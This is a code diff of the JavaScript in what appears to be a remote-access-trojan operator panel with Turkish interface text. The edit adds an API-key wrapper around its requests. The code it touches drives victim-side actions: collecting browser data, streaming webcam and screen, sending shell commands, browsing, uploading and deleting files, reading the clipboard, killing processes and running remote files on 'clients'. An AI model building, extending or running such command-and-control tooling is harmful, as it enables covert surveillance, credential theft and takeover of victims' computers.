@@ -954,6 +954,19 @@
     </div>
 
     <script>
+        const API_KEY = "{{.Key}}";
+
+        async function apiFetch(url, options = {}) {
+            if (!options.headers) options.headers = {};
+            options.headers['X-API-Key'] = API_KEY;
+
+            const response = await fetch(url, options);
+            if (response.status === 401) {
+                window.location.href = '/login';
+            }
+            return response;
+        }
+
         // ─── Sayfa Geçişi ────────────────────────────────
         const pages = ['home', 'clients', 'builder', 'settings', 'account'];
         const pageTitles = { home: 'Home', clients: 'Clients', builder: 'Builder', settings: 'Settings', account: 'Account' };
@@ -993,7 +1006,7 @@
         // ─── Settings ────────────────────────────────────
         async function loadSettings() {
             try {
-                const res = await fetch('/api/settings', { credentials: 'include' });
+                const res = await apiFetch('/api/settings', { credentials: 'include' });
                 if (!res.ok) return;
                 const s = await res.json();
                 document.getElementById('settings-tcp-port').value = s.tcp_port || '';
@@ -1038,7 +1051,7 @@
                 if (type === 'tcp') body.tcp_port = val;
                 if (type === 'heartbeat') body.heartbeat_interval = parseInt(val, 10);
 
-                const res = await fetch('/api/settings', {
+                const res = await apiFetch('/api/settings', {
                     method: 'POST',
                     credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
@@ -1082,7 +1095,7 @@
 
         async function fetchStats() {
             try {
-                const res = await fetch('/api/stats', { credentials: 'include' });
+                const res = await apiFetch('/api/stats', { credentials: 'include' });
                 if (!res.ok) return;
                 const s = await res.json();
 
@@ -1279,7 +1292,7 @@
             statusEl.className = 'collect-status';
             setBrowseBrowserStatus('⏳ ' + browser.charAt(0).toUpperCase() + browser.slice(1) + ' verisi toplanıyor...', 'loading');
             try {
-                const res = await fetch('/api/browser/collect', {
+                const res = await apiFetch('/api/browser/collect', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, browser: browser })
@@ -1359,7 +1372,7 @@
                 return;
             }
             try {
-                const res = await fetch('/api/send', {
+                const res = await apiFetch('/api/send', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, cmd: '[msg] ' + msg })
@@ -1392,7 +1405,7 @@
             appendTerminalLine('cmd', promptText + ' ' + cmd);
             input.value = '';
             try {
-                await fetch('/api/send', {
+                await apiFetch('/api/send', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, cmd: prefix + cmd })
@@ -1411,7 +1424,7 @@
             appendTerminalLine('cmd', promptText + ' ' + cmd);
             input.value = '';
             try {
-                await fetch('/api/send', {
+                await apiFetch('/api/send', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, cmd: prefix + cmd })
@@ -1448,7 +1461,7 @@
             currentCamFps = parseInt(val);
             document.getElementById('cam-fps-value').textContent = val;
             if (isCaming && selectedID) {
-                fetch('/api/cam/ctrl', {
+                apiFetch('/api/cam/ctrl', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, action: 'start', fps: currentCamFps })
@@ -1460,7 +1473,7 @@
         async function camStart() {
             if (!selectedID) return;
             try {
-                const res = await fetch('/api/cam/ctrl', {
+                const res = await apiFetch('/api/cam/ctrl', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, action: 'start', fps: currentCamFps })
@@ -1481,7 +1494,7 @@
             document.getElementById('cam-img').style.display = 'none';
             document.getElementById('cam-placeholder').style.display = 'flex';
             try {
-                await fetch('/api/cam/ctrl', {
+                await apiFetch('/api/cam/ctrl', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, action: 'stop' })
@@ -1502,7 +1515,7 @@
         async function syncCamStatus() {
             if (!selectedID) return;
             try {
-                const res = await fetch('/api/cam/status?id=' + selectedID, { credentials: 'include' });
+                const res = await apiFetch('/api/cam/status?id=' + selectedID, { credentials: 'include' });
                 if (!res.ok) return;
                 const data = await res.json();
                 isCaming = data.caming;
@@ -1524,7 +1537,7 @@
         async function pollCam() {
             if (!selectedID || !isCaming) return;
             try {
-                const res = await fetch('/api/cam?id=' + selectedID, { credentials: 'include' });
+                const res = await apiFetch('/api/cam?id=' + selectedID, { credentials: 'include' });
                 if (res.status === 204) return;
                 if (!res.ok) return;
                 const data = await res.json();
@@ -1546,7 +1559,7 @@
             document.getElementById('fps-value').textContent = val;
             // Yayın aktifse yeni FPS'i hemen uygula
             if (isScreening && selectedID) {
-                fetch('/api/screen/ctrl', {
+                apiFetch('/api/screen/ctrl', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, action: 'start', fps: currentFps })
@@ -1559,7 +1572,7 @@
         async function screenStart() {
             if (!selectedID) return;
             try {
-                const res = await fetch('/api/screen/ctrl', {
+                const res = await apiFetch('/api/screen/ctrl', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, action: 'start', fps: currentFps })
@@ -1580,7 +1593,7 @@
             document.getElementById('screen-img').style.display = 'none';
             document.getElementById('screen-placeholder').style.display = 'flex';
             try {
-                await fetch('/api/screen/ctrl', {
+                await apiFetch('/api/screen/ctrl', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, action: 'stop' })
@@ -1601,7 +1614,7 @@
         async function syncScreenStatus() {
             if (!selectedID) return;
             try {
-                const res = await fetch(`/api/screen/status?id=${selectedID}`, { credentials: 'include' });
+                const res = await apiFetch(`/api/screen/status?id=${selectedID}`, { credentials: 'include' });
                 if (!res.ok) return;
                 const data = await res.json();
                 isScreening = data.screening;
@@ -1623,7 +1636,7 @@
         async function pollScreen() {
             if (!selectedID || !isScreening) return;
             try {
-                const res = await fetch(`/api/screen?id=${selectedID}`, { credentials: 'include' });
+                const res = await apiFetch(`/api/screen?id=${selectedID}`, { credentials: 'include' });
                 if (res.status === 204) return;
                 if (!res.ok) return;
                 const data = await res.json();
@@ -1639,7 +1652,7 @@
             if (!selectedID) return;
             const state = shellState[currentShell];
             try {
-                const res = await fetch(`/api/output?id=${selectedID}`, { credentials: 'include' });
+                const res = await apiFetch(`/api/output?id=${selectedID}`, { credentials: 'include' });
                 if (!res.ok) return;
                 const outputs = await res.json();
                 if (!outputs || !outputs.length) return;
@@ -1664,7 +1677,7 @@
             btn.textContent = '↻ Yükleniyor...';
             setTaskStatus('', '');
             try {
-                const res = await fetch('/api/tasklist', {
+                const res = await apiFetch('/api/tasklist', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID })
@@ -1759,7 +1772,7 @@
             if (!confirm(`"${name}" (PID: ${pid}) sonlandırılsın mı?`)) return;
             setTaskStatus('info', `PID ${pid} sonlandırılıyor...`);
             try {
-                const res = await fetch('/api/taskkill', {
+                const res = await apiFetch('/api/taskkill', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, pid: pid })
@@ -1829,7 +1842,7 @@
             fbLoading = true;
             fbSetStatus('info', '↻ Yükleniyor...');
             try {
-                const res = await fetch('/api/fb/ls', {
+                const res = await apiFetch('/api/fb/ls', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, path: path })
@@ -2005,7 +2018,7 @@
         async function fbDownload(path, name) {
             fbSetStatus('info', `↓ İndiriliyor: ${name}...`);
             try {
-                const res = await fetch('/api/fb/download', {
+                const res = await apiFetch('/api/fb/download', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, path })
@@ -2030,7 +2043,7 @@
         // ─── Sil ─────────────────────────────────────────
         async function fbDelete(path) {
             try {
-                const res = await fetch('/api/fb/delete', {
+                const res = await apiFetch('/api/fb/delete', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, path })
@@ -2049,7 +2062,7 @@
             if (!name || !name.trim()) return;
             const full = fbBuildPath(name.trim());
             try {
-                const res = await fetch('/api/fb/mkdir', {
+                const res = await apiFetch('/api/fb/mkdir', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, path: full })
@@ -2076,7 +2089,7 @@
                     reader.readAsDataURL(file);
                 });
                 try {
-                    const r = await fetch('/api/fb/upload', {
+                    const r = await apiFetch('/api/fb/upload', {
                         method: 'POST', credentials: 'include',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ id: selectedID, path: targetPath, data: b64 })
@@ -2101,7 +2114,7 @@
             const dir     = sepIdx >= 0 ? oldPath.substring(0, sepIdx + 1) : '';
             const newPath = dir + trimmedName;
             try {
-                const res = await fetch('/api/fb/rename', {
+                const res = await apiFetch('/api/fb/rename', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, old: oldPath, new: newPath })
@@ -2190,7 +2203,7 @@
         // ─── Client Listesi Güncelle ─────────────────────
         async function refreshClients() {
             try {
-                const res = await fetch('/api/clients', { credentials: 'include' });
+                const res = await apiFetch('/api/clients', { credentials: 'include' });
                 if (!res.ok) return;
                 const clients = await res.json();
                 const count = clients ? clients.length : 0;
@@ -2369,7 +2382,7 @@
             document.getElementById('rfe-result-card').style.display = 'none';
 
             try {
-                const res = await fetch('/api/rfe', {
+                const res = await apiFetch('/api/rfe', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, url, type: rfeType, args })
@@ -2428,7 +2441,7 @@
             cbSetStatus('loading', 'Clipboard okunuyor...');
             document.getElementById('cb-read-area').value = '';
             try {
-                const res = await fetch('/api/clipboard/get', {
+                const res = await apiFetch('/api/clipboard/get', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID })
@@ -2460,7 +2473,7 @@
             btnText.textContent = '⏳ Yazılıyor...';
             cbSetStatus('loading', 'Clipboard yazılıyor...');
             try {
-                const res = await fetch('/api/clipboard/set', {
+                const res = await apiFetch('/api/clipboard/set', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, text })
@@ -2525,7 +2538,7 @@
             statusEl.className = 'cs-action-status cs-status-loading';
 
             try {
-                const res = await fetch('/api/client/update', {
+                const res = await apiFetch('/api/client/update', {
                     method: 'POST',
                     credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
@@ -2563,7 +2576,7 @@
             statusEl.className = 'cs-action-status cs-status-loading';
 
             try {
-                const res = await fetch('/api/send', {
+                const res = await apiFetch('/api/send', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, cmd: '[set_delay]' + delay })
@@ -2595,7 +2608,7 @@
             statusEl.className = 'cs-action-status cs-status-loading';
 
             try {
-                const res = await fetch('/api/send', {
+                const res = await apiFetch('/api/send', {
                     method: 'POST', credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: selectedID, cmd: '[' + action + ']' })
